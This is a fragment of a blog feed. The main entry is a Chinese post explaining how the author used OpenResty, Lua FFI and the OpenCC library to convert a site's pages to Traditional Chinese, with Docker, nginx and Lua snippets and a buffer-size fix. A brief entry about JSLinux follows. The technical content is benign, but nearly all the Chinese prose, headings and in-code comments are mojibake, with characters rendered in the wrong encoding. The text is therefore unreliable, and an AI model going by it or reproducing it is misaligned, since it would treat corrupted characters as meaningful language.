        <content type="text/html" src="https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html"><![CDATA[<blockquote><p>ÊÉ≥Ë¶ÅÊü•ÁúãÊú¨Á´ôÁöÑÊ≠£‰Ωì‰∏≠ÊñáÁâàÊú¨ÔºåÁÇπÂáªÈ°µËÑöÂ§ÑÁöÑ‚ÄúÊ≠£È´î‰∏≠Êñá‚ÄùÈìæÊé•Âç≥ÂèØ„ÄÇ</p></blockquote><p>ÂÖ≥‰∫éËøôÁØáÊñáÁ´†ÁöÑËÉåÊôØÔºåÁúüÊòØËØ¥Êù•ËØùÈïø‚Ä¶‚Ä¶</p><p>Â§ßÊ¶ÇÂú®ÂÖ´Âπ¥ÂâçÔºåÊàëÂéª CTSC Êâì‰∫Ü‰∏™ÈÖ±Ê≤πÔºàÈùûÈõÜËÆ≠ÈòüÔºåÂè™ÊòØÂéªÁé©ÁöÑÔºâÔºåÂú®ÈÇ£Âá†Â§©ÈáåÔºåÊàëÊé•Âèó‰∫ÜËÆ∏Â§öÂ§ß‰Ω¨‰ª¨ÁöÑÂüπËÆ≠ÔºåÂç∞Ë±°ÊØîËæÉÊ∑±ÂàªÁöÑÊòØ <a href="https://www.byvoid.com/">BYVoid</a> Â§ß‰Ω¨ÔºåÂõ†‰∏∫‰ªñÂú® PPT ‰∏≠Êîæ‰∫ÜËá™Â∑±ÁΩëÁ´ôÁöÑÈìæÊé•ÔºåÊàëÁÇπËøõÂéª‰πãÂêéÂèëÁé∞ÂèØ‰ª•ÈöèÊÑèÂàáÊç¢‚ÄúÁÆÄ‰Ωì‚ÄùÂíå‚ÄúÁπÅ‰Ωì‚ÄùÔºåËÄå‰∏î‰ºº‰πéË∑üÊàë‰ª•ÂâçËßÅËøáÁöÑÂõΩÈôÖÂåñ‰∏çÂêåÔºåÊñáÁ´†ÂÜÖÂÆπ‰πü‰ºöÈöèÁùÄÂàáÊç¢„ÄÇÂΩìÊó∂ÊàëÂØπ Web ÂºÄÂèë‰∏ÄÁ™ç‰∏çÈÄöÔºåÊâÄ‰ª•Ê≤°ÊúâËÉΩÂäõÂ•ΩÂ•ΩÁ†îÁ©∂ËøôÁ©∂Á´üÊòØÊÄé‰πàÂÆûÁé∞ÁöÑ„ÄÇ</p><p>ÂêéÊù•Êúâ‰∏ÄÊ¨°Êú∫ÁºòÂ∑ßÂêàÔºåÊàëÁúãÂà∞‰∫Ü‰∏Ä‰∏™Âè´ <a href="https://github.com/BYVoid/OpenCC">OpenCC</a> ÁöÑÈ°πÁõÆÔºàÂ∑ßÂêàÁöÑÊòØÔºå‰ΩúËÄÖÂ∞±ÊòØ BYVoidÔºâÔºåËøô‰∏™È°πÁõÆÂèØ‰ª•ÊääÊ±âÂ≠óÂú®‰∏≠ÂõΩÂ§ßÈôÜ„ÄÅÈ¶ôÊ∏Ø„ÄÅÂè∞Êπæ‰∏âÁßçÊ®°Âºè‰∏ã‰∫íÁõ∏ËΩ¨Êç¢ÔºåÂØπ‰∫é‰∏ìÁî®ËØçÊ±áÂíåÂú∞Âå∫ÊÉØÁî®Â≠óÁöÑËΩ¨Êç¢ÂÅöÁöÑÁõ∏ÂΩì‰∏çÈîôÔºåËÄå‰∏îÂ∑≤ÁªèÊòØ Linux ‰∏ãÈùûÂ∏∏ÈÄöÁî®ÁöÑÂ∫ì„ÄÇÂêéÊù•ÊàëÂèàÂæóÁü•ÔºåBYVoid ÁöÑÁΩëÁ´ôÂ∞±ÊòØÂà©Áî®‰∫Ü OpenCC ÂÅöÁöÑËΩ¨Êç¢„ÄÇ</p><p>ÂΩìÊó∂ÁöÑÊàëÂ∞ùËØïÁî® PHP Êù•Ë∞ÉÁî® OpenCC ÁöÑÂáΩÊï∞Ôºå‰ΩÜÁî±‰∫éÂ∑•‰ΩúÈáèËøáÂ§ßÔºàÂä†‰∏äÊàëËèúÔºâÔºå‰∫éÊòØ‰πüÊ≤°ËÉΩÂÆûÁé∞„ÄÇÂêéÊù•ÊÉ≥Âà∞‰∏∫‰ªÄ‰πà‰∏çÂú® Nginx Áõ¥Êé•Ë∞ÉÁî® OpenCC ÊääÈ°µÈù¢ËΩ¨Êç¢‰∏Ä‰∏ãÂÜçËøîÂõûÁªôÊµèËßàÂô®Âë¢ÔºüÊàëÊü•‰∫Ü‰∏Ä‰∏ãÔºåNginx Ëá™Ë∫´ËôΩÁÑ∂Ê≤°ÊúâË∞ÉÁî®Â§ñÈÉ®ÂáΩÊï∞ÁöÑÂäüËÉΩÔºå‰ΩÜ OpenRestyÔºàÊú¨Ë¥®‰∏äÊòØ Nginx+LuaÔºâ‰ºº‰πéÂèØ‰ª•„ÄÇ‰ΩÜÊòØÁî±‰∫éÂΩìÊó∂ÊàëÂØπ Nginx ‰πü‰∏çÁÜüÔºåÊÑüËßâÊç¢Êàê OpenResty ÂèàË¶ÅË∏©‰∏ÄÂ†ÜÂùëÔºå‰∫éÊòØ‰πü‰ΩúÁΩ¢‰∫Ü„ÄÇ</p><p>ÂéªÂπ¥Êüê‰∏ÄÂ§©ÔºåÊàëÂ∞ÜËá™Â∑±ÁöÑÁΩëÁ´ôËøÅÁßªÂà∞‰∫Ü‰∏Ä‰∏™ÈÖçÁΩÆÊõ¥Â•ΩÁöÑÊúçÂä°Âô®ÔºåÂπ∂‰∏îÂÖ®Èù¢ Docker ÂåñÔºàÊú¨Âú∞ÂºÄÂèëÁöÑÊó∂ÂÄô‰πüÂú® Docker ‰∏äÔºåÂè™ÊòØÁî®‰∫ÜÂè¶‰∏Ä‰ªΩÈÖçÁΩÆÊñá‰ª∂ËÄåÂ∑≤ÔºâÔºå‰ªé Nginx Êç¢Êàê OpenResty ÁÆÄÁõ¥Ë∑üÊç¢Ë°£Êúç‰∏ÄÊ†∑ËΩªÊùæÔºõÂä†‰∏äËá™ÊàëÊÑüËßâÁé∞Âú®ÁöÑÊ∞¥Âπ≥Â∫îÂΩìË∂≥Â§ü‰∫ÜÔºå‰∫éÊòØ‰æøÂºÄÂßã‰∫ÜÂèà‰∏ÄÊ¨°ÁöÑÂ∞ùËØï„ÄÇ</p><p>ÈÄöËøá‰∏Ä‰∫õÊêúÁ¥¢ÔºåÊàëÂèëÁé∞Â∑≤ÁªèÊúâ‰∫∫ÊàêÂäü‰ΩøÁî® OpenResty Êèê‰æõÁöÑ Lua FFI Ë∞ÉÁî®‰∫Ü OpenCC ÁöÑ <code>.so</code> Â∫ìÔºå‰ΩÜÁî±‰∫éÊòØÁªô‰ªòË¥πÂÆ¢Êà∑ÂÅöÁöÑÔºåÂõ†Ê≠§‰∏çÊñπ‰æøÂÖ¨ÂºÄÊ∫êÁ†Å„ÄÇËôΩÁÑ∂ÊúâÁÇπÈÅóÊÜæÔºå‰ΩÜÊàëËßâÂæóÔºåÊó¢ÁÑ∂Êúâ‰∫Ü‰∏Ä‰∏™ÂèØË°åÁöÑÊÄùË∑ØÔºåÈÇ£Êàë‰∏ÄÂÆöËÉΩÊêûÂá∫Êù•„ÄÇ</p><h1>Âú® Docker ‰∏≠Êê≠Âª∫ OpenResty+OpenCC</h1><p>ËøôÂ∫îÂΩìÊòØÂÖ®ÊñáÊúÄÂÆπÊòìÁêÜËß£ÁöÑÈÉ®ÂàÜ‰∫Ü„ÄÇÁÆÄËÄåË®Ä‰πãÔºåË¶ÅÊÉ≥ËææÊàêÁõÆÊ†áÔºåÊàë‰ª¨È¶ñÂÖàÈúÄË¶ÅÊúâ‰∏Ä‰∏™ OpenResty Âíå OpenCC„ÄÇÁªèËøáÊêúÁ¥¢ÔºåÊàëÊâæÂà∞‰∫Ü <a href="https://github.com/hustshawn/openresty-opencc-docker">hustshawn/openresty-opencc-docker</a> Ëøô‰∏™È°πÁõÆ„ÄÇ</p><p>ÁúãËµ∑Êù•ÂÆÉÁöÑ Dockerfile Ê≤°‰ªÄ‰πàÈóÆÈ¢òÔºåÂè™ÊòØ OpenResty ÁöÑÁâàÊú¨Á®çÂæÆÊóß‰∫Ü‰∏Ä‰∫õÔºå‰∫éÊòØÊàë Fork ‰∫Ü‰∏Ä‰ªΩ„ÄÅÊîπ‰∫Ü‰∏Ä‰∏ãÁâàÊú¨ÂêéÔºåÊâìÊàê‰∫ÜËá™Â∑±ÁöÑ‰∏Ä‰∏™ Docker ÈïúÂÉè <a href="https://hub.docker.com/r/rexskz/openresty-opencc-docker">rexskz/openresty-opencc-docker</a>„ÄÇË¶ÅÊÉ≥ÂêØÂä®Ëµ∑Êù•ÔºåÂè™ÈúÄË¶ÅÂú® <code>compose.yml</code> ‰∏≠ËøôÊ†∑ÂÜôÔºà‰πãÊâÄ‰ª• <code>name</code> ËøòÂè´ <code>nginx</code>ÔºåÂõ†‰∏∫ÂÆÉÊú¨Ë¥®‰∏äÂ∞±ÊòØ‰∏™ NginxÔºåÂ∞±Â•ΩÊØî MariaDB ÁöÑÂèØÊâßË°åÁ®ãÂ∫è‰æùÊóßÂè´ <code>mysql</code>ÔºâÔºö</p><pre><code class="lang-yaml">services:
  nginx:
    image: rexskz/openresty-opencc-docker
    container_name: nginx
    hostname: nginx
    # ....ÁúÅÁï•ÂÖ∂ÂÆÉÁöÑÈÖçÁΩÆ</code></pre><p>ÂêØÂä®ÂÆπÂô®ÂêéËøõÂéªËΩ¨‰∫Ü‰∏ÄÂúàÔºåÂèëÁé∞ OpenCC Áõ∏ÂÖ≥ÁöÑÊâÄÊúâÊï∞ÊçÆÊñá‰ª∂ÈÉΩÂú® <code>/usr/share/opencc/</code> ÁõÆÂΩï‰∏ãÔºåÁî±‰∫éÊàëÊÉ≥ÊääÁÆÄ‰Ωì‰∏≠ÊñáËΩ¨Êç¢‰∏∫Âè∞ÊπæÁöÑÊ≠£‰Ωì‰∏≠ÊñáÔºåÂπ∂ÈúÄË¶ÅËΩ¨Êç¢‰∏ìÁî®ËØçÊ±áÂíåÂú∞Âå∫ÊÉØÁî®Â≠óÔºåÂõ†Ê≠§ÈúÄË¶ÅÂä†ËΩΩÂÖ∂‰∏≠ÁöÑ <code>s2twp.json</code> Êñá‰ª∂„ÄÇ</p><h1>‰∫ÜËß£ OpenResty ÁöÑ‰∏Ä‰∫õÂü∫Á°ÄÁü•ËØÜ</h1><p>OpenResty ‰πãÊâÄ‰ª•ÂèØ‰ª•ÂÅöÂà∞ËÆ∏Â§ö‰∫ãÊÉÖÔºåÂõ†‰∏∫ÂÆÉÂÜÖÁΩÆ‰∫Ü‰∏Ä‰∏™ LuaJITÔºåÂèØ‰ª•‰ΩøÁî® Lua Ëøô‰∏™ËÑöÊú¨ËØ≠Ë®ÄÊù•Ëá™ÂÆö‰πâÂ§ÑÁêÜÈÄªËæëÔºå‰æãÂ¶Ç CloudFlare Â∞±Áî®ÂÆÉÊù•ÂÅö WAF„ÄÇÊàë‰ª¨ËøôÊ¨°ÁöÑÁõÆÊ†áÂæàÂçïÁ∫Ø‚Äî‚ÄîÂ¶ÇÊûúÂèëÁé∞Êúâ <code>cc_lang=zh_TW</code> Ëøô‰∏™ CookieÔºåÂ∞±Â∞Ü Response ‰∏≠ÁöÑÊ±âÂ≠óËΩ¨Êç¢‰∏∫Âè∞ÊπæÁöÑÊ≠£‰Ωì‰∏≠Êñá„ÄÇ</p><p>ÁªèËøáÊü•ÈòÖ OpenResty ÁöÑÊñáÊ°£ÔºåÊàëÂèëÁé∞Êúâ‰∏§‰∏™Êåá‰ª§ÂèØ‰ª•Êª°Ë∂≥ÊàëÁöÑÈúÄÊ±ÇÔºö<code>body_filter_by_lua_block</code> Âíå <code>body_filter_by_lua_file</code>ÔºàËá≥‰∫é <code>body_filter_by_lua</code>ÔºåÊñáÊ°£ËØ¥Â∑≤Áªè‰∏çÊé®Ëçê‰ΩøÁî®‰∫ÜÔºâÔºåÂâçËÄÖÊòØÁõ¥Êé•Â∞Ü Lua ‰ª£Á†ÅÂÜôÂà∞ Nginx ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÔºåÂêéËÄÖÊòØÂÜôÂà∞ÁâπÂÆöÁöÑ Lua Êñá‰ª∂‰∏≠„ÄÇÊàëÈÄâÊã©‰∫ÜÂêéËÄÖÔºåÂõ†‰∏∫ÂêéËÄÖÂú®ÂºÄÂèëÁéØÂ¢É‰∏≠‰ºöÊõ¥Â•ΩÁî®‰∏Ä‰∫õÔºöÂèØ‰ª•Âú® Nginx ÈÖçÁΩÆÊñá‰ª∂‰∏≠Ê∑ªÂä† <code>lua_code_cache off</code> Êåá‰ª§ÔºåÊØèÊ¨°‰øÆÊîπ‰∫Ü Lua Êñá‰ª∂ÂêéÊó†ÈúÄ <code>nginx -s reload</code>„ÄÇ</p><h1>‰∫ÜËß£ OpenResty ÁöÑ Lua Êñá‰ª∂</h1><p>OpenResty ‰πãÊâÄ‰ª•ÂèØ‰ª•Ë∞ÉÁî® Lua Êù•‰øÆÊîπËØ∑Ê±ÇÂíåÂìçÂ∫îÔºåÊòØÂõ†‰∏∫Âú® LuaJIT ‰∏≠ÔºåÂèØ‰ª•ÈÄöËøá‰∏Ä‰∏™Âè´ <code>ngx</code> ÁöÑÂÖ®Â±ÄÂèòÈáèÊù•Ëé∑Âèñ Nginx ÁöÑÊï∞ÊçÆÊàñËÄÖ‰∏é Nginx ‰∫íÂä®Ôºå‰æãÂ¶ÇÂú® <code>body_filter_by_lua</code> ‰∏≠Âä†ËΩΩÁöÑ Lua ËÑöÊú¨Ôºö</p><ul><li>ÂèØ‰ª•Áî® <code>ngx.arg[1]</code> Ëé∑Âèñ Nginx ÁöÑ Response bodyÔºõ</li><li>ÂèØ‰ª•Áî® <code>ngx.var['cookie_cc_lang']</code> Ëé∑ÂèñÂêç‰∏∫ <code>cc_lang</code> ÁöÑ Cookie ÂÄºÔºõ</li><li>ÂèØ‰ª•Áî® <code>ngx.log(ngx.NOTICE, &quot;xxx&quot;)</code> ÂæÄ Nginx ÁöÑ Notice Á∫ßÂà´ÁöÑ Log ‰∏≠ËæìÂá∫‰∏ÄÂè•ËØù„ÄÇ</li></ul><p>ÂÆåÊï¥ÁöÑ <code>ngx</code> API Âú®ËøôÈáåÔºö<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API - OpenResty Reference</a>„ÄÇ</p><p>Ëá≥‰∫é Lua ÁöÑ FFIÔºåÁúã‰∫ÜÊñáÊ°£‰πãÂêé‰πüÂèëÁé∞ÊòØÁõ∏ÂΩìÁÆÄÂçïÔºåÂè™ÈúÄË¶ÅÂ¶Ç‰∏ãÂá†Ê≠•Ôºö</p><ol><li><code>require('ffi')</code>ÔºàÂ∫üËØùÔºâÔºõ</li><li>ÂÆö‰πâÂáΩÊï∞Á≠æÂêçÔºåÁî®ÁöÑÊòØ C ÁöÑËØ≠Ê≥ïÔºõ</li><li>ÈÄöËøá‰∏ÄÊù°ÂëΩ‰ª§Âä†ËΩΩÂä®ÊÄÅÈìæÊé•Â∫ìÔºõ</li><li>Áõ¥Êé•Ë∑ü JavaScript ‰∏ÄÊ†∑Ë∞ÉÁî®Âç≥ÂèØ„ÄÇ</li></ol><p>Ë¶ÅÊÉ≥ÂÆåÊàêÊú¨ÊñáÁöÑÁõÆÊ†áÔºåÂè™ÈúÄÁúã <a href="https://moonbingbing.gitbooks.io/openresty-best-practices/lua/FFI.html">FFI ¬∑ OpenRestyÊúÄ‰Ω≥ÂÆûË∑µ</a> Ëøô‰∏Ä‰∏™È°µÈù¢Â∞±Ë∂≥Â§ü‰∫Ü„ÄÇ</p><h1>‰∫ÜËß£ OpenCC ÁöÑ C API</h1><p>ÊâÄÊúâÂèØ‰ª•ÈÄöËøá FFI Ë∞ÉÁî®ÁöÑ C API Âú®ËøôÈáåÔºö<a href="http://byvoid.github.io/OpenCC/1.0.4/group__opencc__c__api.html">Open Chinese Convert: OpenCC C API</a>ÔºåÂè™ÊúâÈùûÂ∏∏Â∞ëÁöÑÂá†‰∏™ÂáΩÊï∞ÔºåÈÄöËøáÊèèËø∞Êàë‰ª¨Â§ßÊ¶ÇÂèØ‰ª•ÂæóÂá∫Ë∞ÉÁî®È°∫Â∫èÔºö</p><pre><code class="lang-c">opencc_t inst = opencc_open(&quot;/usr/share/opencc/s2twp.json&quot;);

// ÊñáÂ≠óÊòØ utf8 ÁºñÁ†Å
char *input = &quot;ËøôÊòØ‰∏ÄÊÆµÊñáÂ≠ó&quot;;
char *output = opencc_convert_utf8(inst, input, strlen(input));

// ÂΩìÁÑ∂‰πüÂèØ‰ª•Áî®Ëøô‰∏ÄÁßçÊÄùË∑ØÔºöÂç≥ÊèêÂâçÂàÜÈÖçÂ•Ω output ÁöÑÁ©∫Èó¥
// char *output = (char *)malloc(sizeof(char) * strlen(input) + 1);
// opencc_convert_utf8_to_buffer(inst, input, strlen(input), output);

// ÊÉ≥ÂäûÊ≥ïÊää output ‰øùÂ≠òËµ∑Êù•
....

// ÊúÄÂêéÈúÄË¶ÅÂÅö‰∏Ä‰∫õÊ∏ÖÁêÜÔºåÂê¶ÂàôÂèØËÉΩ‰ºöÂÜÖÂ≠òÊ≥ÑÊºè
opencc_convert_utf8_free(output);
opencc_close(inst);</code></pre><h1>ÂºÄÂßãÊ≠£ÂºèÁöÑÂÆûË∑µ</h1><p>ÁêÜÊ∏ÖÊÄùË∑Ø‰πãÂêéÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÂºÄÂßãÂÜô‰∫ÜÔºÅÈ¶ñÂÖàÊñ∞Âª∫‰∏Ä‰∏™ <code>nginx-opencc-filter.lua</code> ÁöÑÊñá‰ª∂ÔºåÂπ∂Â∞ÜÂÖ∂ÊåÇËΩΩÂà∞ OpenResty ÂÆπÂô®‰∏≠Ôºö</p><pre><code class="lang-yaml">services:
  nginx:
    volumes:
      # ËøôÊòØÊàëÁΩëÁ´ôÁöÑÈÖçÁΩÆÊñá‰ª∂
      - ./nginx-docker-live.conf:/path/to/rexskz.conf
      # ËøôÊòØÂàöÂàöÊñ∞Âª∫ÁöÑ .lua Êñá‰ª∂
      - ./nginx-opencc-filter.lua:/path/to/opencc-filter.lua
    # ....ÁúÅÁï•ÂÖ∂ÂÆÉÁöÑÈÖçÁΩÆ</code></pre><p>ÁÑ∂ÂêéÂú® OpenResty ÈÖçÁΩÆÊñá‰ª∂‰∏≠Âä†ËΩΩËøô‰∏™ Lua Êñá‰ª∂Ôºö</p><pre><code class="lang-nginx"># Âè™‰∏∫‰Ω†ÈúÄË¶ÅËΩ¨Êç¢ÁöÑÈ°µÈù¢Ê∑ªÂä†Ëøô‰∏™ÈÖçÁΩÆÔºå‰∏çË¶ÅÊâÄÊúâÁöÑ location ÈÉΩÂä†
location /your-page {
    body_filter_by_lua_file /path/to/opencc-filter.lua;
    # ....ÁúÅÁï•ÂÖ∂ÂÆÉÁöÑÈÖçÁΩÆ
}</code></pre><p>Êé•‰∏ãÊù•ÂºÄÂßãÂÜô Lua ËÑöÊú¨‰∫ÜÔºÅËá≥‰∫é Lua ÁöÑÁÆÄÂçïËØ≠Ê≥ïÔºåÁΩë‰∏äÊúâÂæàÂ§öÔºåËøôÂÑøÂ∞±‰∏çËµòËø∞‰∫Ü„ÄÇÊï¥‰∏™ËÑöÊú¨ÊòØËøôÊ†∑ÁöÑÔºåÂü∫Êú¨ÁöÑÊÄùË∑ØË∑üÂàöÊâçÂÜôÁöÑ C ‰ª£Á†ÅÂ∑Æ‰∏çÂ§öÔºåÂ∫îÂΩìÈùûÂ∏∏Â•ΩÁêÜËß£Ôºö</p><pre><code class="lang-lua">local cookie_value = ngx.var['cookie_cc_lang']

if cookie_value == 'zh_TW' then
    local ffi = require('ffi')

    ffi.cdef[[
        typedef void* opencc_t;

        opencc_t opencc_open(const char *configFileName);
        int      opencc_close(opencc_t opencc);
        char*    opencc_convert_utf8(opencc_t opencc, const char *input, size_t length);
        void     opencc_convert_utf8_free(char *str);
    ]]

    local cc = ffi.load('opencc')

    local inst = cc.opencc_open('/usr/share/opencc/s2twp.json')
    local input = ngx.arg[1]
    local res = cc.opencc_convert_utf8(inst, input, #input)

    ngx.arg[1] = ffi.string(res)

    cc.opencc_convert_utf8_free(res)
    cc.opencc_close(inst)
end</code></pre><p>Ê∑ªÂä†‰∫Ü Cookie ‰πãÂêéÂà∑Êñ∞‰∏Ä‰∏ãÔºåÂèëÁé∞È°µÈù¢Â∑≤ÁªèÊòØÊ≠£‰Ωì‰∏≠ÊñáÁâàÊú¨‰∫ÜÔºÅ‰πãÂêéÁöÑÊìç‰ΩúÂ∞±ÊòØÂú®È°µÈù¢‰∏≠ÈÄÇÂΩìÁöÑÂú∞ÊñπÂä†‰∏äÁÆÄ‰Ωì‰∏≠ÊñáÂíåÊ≠£‰Ωì‰∏≠ÊñáÁöÑÈìæÊé•„ÄÇ</p><h1>Áî±‰∫é Buffer ÂØºËá¥ÁöÑ Bug</h1><p>Â•áÊÄ™ÁöÑÊòØÔºå‰∏çÊòØÊâÄÊúâÁöÑÈ°µÈù¢ÈÉΩÂèØ‰ª•ÊàêÂäüËΩ¨Êç¢ÔºåÊúâ‰∫õÈ°µÈù¢ËøõÂéª‰πãÂêéÂè™ËÉΩÂä†ËΩΩÂæàÂ∞ëÁöÑ‰∏ÄÈÉ®ÂàÜÊñáÊú¨ÔºåÁîöËá≥ÊúâÁöÑÈ°µÈù¢Áõ¥Êé•ÊèêÁ§∫ <code>ERR_INCOMPLETE_CHUNKED_ENCODING</code>„ÄÇÂõûÂéªÁúã Nginx ÁöÑ LogÔºåÂèëÁé∞Âè™Ë¶Å‰∏ÄËÆøÈóÆËøôÊ†∑ÁöÑÈ°µÈù¢ÔºåÂ∞±‰ºöÂ§ö‰∏ÄÂè• <code>worker process 8 exited on signal 11</code>ÔºåÊàëÁúã‰∫ÜÂçäÂ§©ÔºåÊÑüËßâ Lua ËÑöÊú¨‰∏çÂ∫îËØ•Êúâ BugÔºå‰ΩÜ OpenResty ÁöÑ Lua ËÑöÊú¨Âèà‰∏çÊñπ‰æøÂçïÊ≠•Ë∞ÉËØïÔºå‰∫éÊòØÊàëÁ•≠Âá∫‰∫ÜÂÖ´Âπ¥ÂâçÂ∞±ÁÜüÁªÉÊéåÊè°ÁöÑËæìÂá∫Ë∞ÉËØïÂ§ßÊ≥ïÔºåÂú®‰∏ÄÂºÄÂßãÂÖàËæìÂá∫ <code>ngx.arg[1]</code>Ôºå‰øùÂ≠òÂà∑Êñ∞Ôºå‰∫éÊòØÂèëÁé∞‰∫Ü‰∏ÄÂ†Ü UTF-8 ‰∏ãÈù¢ÁöÑ‰π±Á†Å‚Ä¶‚Ä¶Ê≤°ÈîôÔºåÂ∞±ÊòØÈªëËâ≤Ëè±ÂΩ¢ÈáåÈù¢Â∏¶‰∏Ä‰∏™ÈóÆÂè∑ÁöÑÈÇ£Áßç„ÄÇ</p><p>‰∏ÄÊ¨°Ê≠£Â∏∏ÁöÑËØ∑Ê±ÇÔºå‰ºöËæìÂá∫‰∏ÄÊ¨°ÊàñÂ§öÊ¨°ÔºåÊØè‰∏ÄÊ¨°ÈÉΩÊ≤°ÊúâËøôÊ†∑ÁöÑ‰π±Á†ÅÔºõ‰ΩÜÂØπ‰∫é‰∏çÊ≠£Â∏∏ÁöÑËØ∑Ê±ÇÔºå‰∏ÄÂÆö‰ºöÂú®ÊúÄÂêé‰∏ÄÊ¨°ËæìÂá∫ËøôÊ†∑ÁöÑ‰π±Á†ÅÔºåÁÑ∂Âêé Worker process Â∞±Â¥©Ê∫É‰∫Ü„ÄÇÁªèÈ™åÂëäËØâÊàëÔºå‰∏ÄÂÆöÊòØÂõ†‰∏∫ Nginx ‰∏∫‰∫ÜÂä†Âø´ÈÄüÂ∫¶ÔºåÂØπËØ∑Ê±ÇÂÅö‰∫ÜÊµÅÂºèÂ§ÑÁêÜÔºåÂ∞ÜËØ∑Ê±ÇÂíåÂìçÂ∫îÂàáÂàÜÊàêËã•Âπ≤‰∏™ Chunk ÂèëÈÄÅÁªô‰∫Ü Lua ËÑöÊú¨„ÄÇ‰∏ÄÊó¶ÂàáÂàÜÁöÑ‰ΩçÁΩÆÊÅ∞Â•ΩÂú®‰∏Ä‰∏™Ê±âÂ≠óÔºàÂç† 3 ‰∏™Â≠óËäÇÔºâÁöÑ‰∏≠Èó¥ÔºåÈÇ£‰πàËøô‰∏™Ê±âÂ≠óÂ∞±‰ºöË¢´ÂàáÂàÜÊàê‰∏§‰∏™‰π±Á†ÅÔºåË¢´ÂàÜÊï£Âà∞‰∫Ü‰∏§‰∏™ Chunk ‰∏≠„ÄÇ</p><p>OpenCC ‰∏çÈúÄË¶ÅÂØπËøôÁßçÁâπÊÆäÊÉÖÂÜµÂÅöÂÖºÂÆπÔºåËÄå‰∏îÂç≥‰ΩøÂÅö‰∫ÜÂÖºÂÆπÔºå‰πüÊó†Ê≥ïËΩ¨Êç¢Ëøô‰∏™Â≠óÔºàÁîöËá≥Ëøô‰∏™Â≠óÊâÄÂú®ÁöÑËØçËØ≠ÔºâÔºåÂõ†Ê≠§Êàë‰ª¨ËÉΩÂÅöÁöÑÂ∞±ÊòØËÆ© Nginx ‰∏çÂàáÂàÜÈ°µÈù¢ÁöÑ Response body„ÄÇÁî±‰∫éÊàëÁöÑÁΩëÁ´ôÊòØ FastCGI + PHP-FPMÔºà‰∏äÂè§Êó∂ÊúüÁöÑÊäÄÊúØ‰∫ÜÔºâÔºåÂõ†Ê≠§Âè™ÈúÄË¶ÅË∞ÉÂ§ß‰∏Ä‰∏ã Buffer ÁöÑÂÄºÂç≥ÂèØÔºàÁõ¥Êé•ËÆæÁΩÆ <code>fastcgi_buffering off</code> ÊàëËØï‰∫Ü‰ºº‰πéÊ≤°Áî®Ôºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÔºâÔºö</p><pre><code class="lang-nginx">fastcgi_buffers           8 256k;
fastcgi_buffer_size       256k;
fastcgi_busy_buffers_size 512k;</code></pre><p>ÂØπ‰∫é‰ΩøÁî® <code>proxy_pass</code> ‰ª£ÁêÜÁöÑÊÉÖÂÜµÔºåÊúâÁ≠â‰ª∑ÁöÑ <code>proxy_buffer_size</code> Á≠âÊåá‰ª§ÔºåÁî®Ê≥ïÂÆåÂÖ®‰∏ÄÊ†∑„ÄÇ</p><p>‰∫éÊòØ‚Ä¶‚Ä¶ÊàëÁöÑÁΩëÁ´ôÂ∞±ËøôÊ†∑ÊîØÊåÅ‰∫ÜÊ≠£‰Ωì‰∏≠Êñá„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[R¬∑ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/try-jslinux/</id>
        <title><![CDATA[Áî® JSLinux Âú®ÊµèËßàÂô®‰∏≠ËøêË°å Linux]]></title>
        <updated>2020-02-24T16:24:41+08:00</updated>
        <link href="https://blog.invariant.cn/try-jslinux/"/>
        <content type="text/html" src="https://blog.invariant.cn/try-jslinux/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/try-jslinux/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Running Linux in your Browser with JSLinux</div><div class="kg-bookmark-description">Yesterday I ported the Wasm-based hardware emulator, JSLinux, to use xterm.js for frontend and my wstunnel for networking.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="Áî® JSLinux Âú®ÊµèËßàÂô®‰∏≠ËøêË°å Linux"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="Áî® JSLinux Âú®ÊµèËßàÂô®‰∏≠ËøêË°å Linux"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/Alpine_logo.png" alt="Áî® JSLinux Âú®ÊµèËßàÂô®‰∏≠ËøêË°å Linux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> ÊòØ <a href="https://bellard.org/">Fabrice Bellard</a> ÂÜôÁöÑ‰∏Ä‰∏™ÊîØÊåÅ 32 ‰Ωç x86 Âíå 32/64 ‰Ωç RISC-V Á≥ªÁªüÊ®°ÊãüÁöÑÁ°¨‰ª∂Ê®°ÊãüÂô®ÔºåÂèØÁºñËØë‰∏∫ WebAssembly ‰ª•Âú®ÊµèËßàÂô®‰∏≠ËøêË°å„ÄÇ</p><p>Êò®Â§©Êàë<a href="https://github.com/losfair/jslinux-wstunnel">ÂºÄ‰∫Ü‰∏Ä‰∏™ÂàÜÊîØ</a>ÔºåÊääÂ≠óÁ¨¶ÁªàÁ´ØÂÆûÁé∞Êç¢Êàê‰∫Ü <a href="https://xtermjs.org/">xterm.js</a> ÔºåÊääÁΩëÁªúÂÆûÁé∞Êç¢Êàê‰∫ÜÊàëÁöÑ <a href="https://github.com/losfair/wstunnel">wstunnel</a> „ÄÇËøôÈáåÊòØ‰∏Ä‰∏™Âú®‰øÆÊîπÂêéÁöÑ JSLinux ‰∏äËøêË°å Alpine Linux ÁöÑ x86 ËôöÊãüÊú∫ÔºåÂèØ‰ª•Âú®Á∫øËØïÁî®„ÄÇËØ∑‰∏çË¶ÅÊª•Áî®ÁΩëÁªú :)</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html-->]]></content>
        <author>
            <name><![CDATA[The Invariant ‰∏≠Êñá]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/try-jslinux/</id>
        <title><![CDATA[Running Linux in your Browser with JSLinux]]></title>
        <updated>2020-02-24T16:16:18+08:00</updated>
        <link href="https://invariant.me/try-jslinux/"/>
